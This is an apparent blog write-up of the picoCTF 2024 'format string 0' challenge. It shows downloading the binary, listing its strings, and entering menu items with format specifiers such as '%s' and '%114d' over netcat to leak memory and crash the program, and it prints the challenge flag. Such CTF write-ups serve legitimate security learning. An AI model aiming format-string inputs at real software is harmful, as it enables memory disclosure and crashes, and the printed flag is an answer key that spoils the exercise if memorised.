<!DOCTYPE html>
<html>

<body>
    <h1>format string 0- picoctf2024</h1>

    <h2>Challenge Description</h2>
    <pAUTHOR: CHENG ZHANG

Description
Can you use your knowledge of format strings to make the customers happy?
Download the binary  <a href="https://artifacts.picoctf.net/c_mimas/76/format-string-0">here</a>  .
Download the source  <a href="https://artifacts.picoctf.net/c_mimas/76/format-string-0.c">here</a>  .
Additional details will be available after launching your challenge instance.
--------------------
Connect with the challenge instance here:
$nc mimas.picoctf.net 63584

</p>
merge
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
  first download files and run them
<p id="code1">
$wget https://artifacts.picoctf.net/c_mimas/67/format-string-0.c
$wget https://artifacts.picoctf.net/c_mimas/67/format-string-0
$chmod +x ./format-string-0
$ ./format-string-0
</p>
 it need create <a href="https://phantom1ss.github.io/blog/2024/pico2024/formatstring0/flag.txt">flag.txt</a>create it and run it again
it say 
<p id="code1">
Can you help the picky customers find their favorite burger?
</p>
we don't know answers.so on base of hint use hint for use strings vulnerabilities
see options should enter
<pre>
$strings  ./format-string-0
<pre>
and see options in strings content
<p id="code1">
Enter your recommendation: 
Breakf@st_Burger
Gr%114d_Cheese
Bac0n_D3luxe
</p>
test them or use code for see right option
i see that if i choice options in this order can get flag
<pre>
┌──(kali㉿kali)-[~/…/blog/2024/pico2024/formatstring0]
└─$ nc mimas.picoctf.net 63584

Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
 

</pre>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}


</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for strings vulunerability</p>
</body>

 


